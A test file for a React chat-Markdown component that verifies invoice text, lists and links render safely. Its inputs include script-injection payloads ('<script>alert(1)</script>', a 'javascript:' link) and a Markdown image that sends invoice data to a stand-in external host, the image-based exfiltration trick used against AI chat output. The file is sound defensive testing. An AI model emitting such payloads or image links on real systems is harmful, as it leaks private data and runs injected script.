import { expect, test } from "bun:test";

import { renderToStaticMarkup } from "react-dom/server";

import { ChatMarkdown } from "@/components/chat-markdown";

test("renders invoice numbers, lists, and links as safe Markdown", () => {
  const html = renderToStaticMarkup(
    <ChatMarkdown>
      {"Created **0000099**.\n\n- September services\n- Due October 8\n\n[Invoice](/invoices/99)"}
    </ChatMarkdown>,
  );
  expect(html).toContain("<strong>0000099</strong>");
  expect(html).toContain("<li>September services</li>");
  expect(html).toContain('href="/invoices/99"');
  expect(html).not.toContain("**0000099**");
  expect(
    renderToStaticMarkup(
      <ChatMarkdown>{"<script>alert(1)</script> [bad](javascript:alert(1))"}</ChatMarkdown>,
    ),
  ).not.toContain("javascript:");
});

test("assistant Markdown cannot load images containing private invoice data", () => {
  const html = renderToStaticMarkup(
    <ChatMarkdown>
      {"Created **0000097** ![receipt](https://external.test/track?invoice=0000097)"}
    </ChatMarkdown>,
  );
  expect(html).toContain("<strong>0000097</strong>");
  expect(html).not.toContain("<img");
  expect(html).not.toContain("external.test");
});
